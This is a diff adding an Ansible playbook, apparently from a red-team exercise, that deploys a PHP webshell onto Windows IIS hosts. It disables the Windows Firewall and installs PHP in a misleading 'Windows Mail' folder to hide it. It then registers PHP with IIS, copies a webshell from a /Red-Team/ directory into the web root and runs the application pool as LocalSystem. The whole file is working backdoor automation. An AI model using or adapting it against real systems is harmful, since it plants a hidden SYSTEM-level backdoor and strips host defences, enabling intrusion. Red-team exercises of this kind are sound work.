@@ -1,0 +1,71 @@
+---
+- name: Deploy IIS webshell
+  hosts: windows
+  gather_facts: false
+
+  tasks:
+    - name: Disable Windows Firewall for all profiles
+      community.windows.win_firewall:
+        state: disabled
+      ignore_errors: yes
+
+    - name: Install IIS if not installed
+      ansible.windows.win_feature:
+        name: Web-Server
+        state: present
+        include_management_tools: yes
+
+    - name: Install CGI feature
+      ansible.windows.win_feature:
+        name: Web-CGI
+        state: present
+        include_management_tools: true
+
+    - name: Install PHP on target host
+      ansible.windows.win_powershell:
+        script: |
+          New-Item -Path 'C:\Program Files\Windows Mail\PHP' -ItemType Directory -Force | Out-Null
+
+          Invoke-WebRequest `
+            -Uri 'https://windows.php.net/downloads/releases/php-8.4.26-nts-Win32-vs17-x64.zip' `
+            -OutFile 'C:\Program Files\Windows Mail\PHP\php.zip'
+    
+    - name: Extract PHP zip file 
+      community.windows.win_unzip:
+        src: C:\Program Files\Windows Mail\PHP\php.zip
+        dest: C:\Program Files\Windows Mail\PHP
+
+    - name: Install Visual C++ redistributable
+      ansible.windows.win_package:
+        path: https://aka.ms/vc14/vc_redist.x64.exe
+        state: present
+        arguments: /install /passive /norestart
+        expected_return_code:
+          - 0
+          - 3010
+
+    - name: Configure PHP in IIS
+      ansible.windows.win_powershell:
+        script: |
+          $appcmd = "$env:windir\System32\inetsrv\appcmd.exe"
+
+          & $appcmd set config /section:system.webServer/fastCgi "/+[fullPath='C:\Program Files\Windows Mail\PHP\php-cgi.exe']" /commit:apphost
+
+          & $appcmd set config /section:system.webServer/handlers "/+[name='PHP-FastCGI',path='*.php',verb='GET,HEAD,POST',modules='FastCgiModule',scriptProcessor='C:\Program Files\Windows Mail\PHP\php-cgi.exe',resourceType='Either']" /commit:apphost
+
+    - name: Create directory to hold webshell
+      ansible.windows.win_powershell:
+        script: |
+          New-Item -Path 'C:\inetpub\wwwroot\Day2Inject' -ItemType Directory -Force | Out-Null
+
+    - name: Deploy PHP webshell
+      ansible.windows.win_copy:
+        src: /Red-Team/
+        dest: C:\inetpub\wwwroot\Day2Inject\         
+
+    - name: Configure application pool identity
+      microsoft.iis.web_app_pool:
+        name: DefaultAppPool
+        state: started
+        attributes:
+          processModel.identityType: LocalSystem
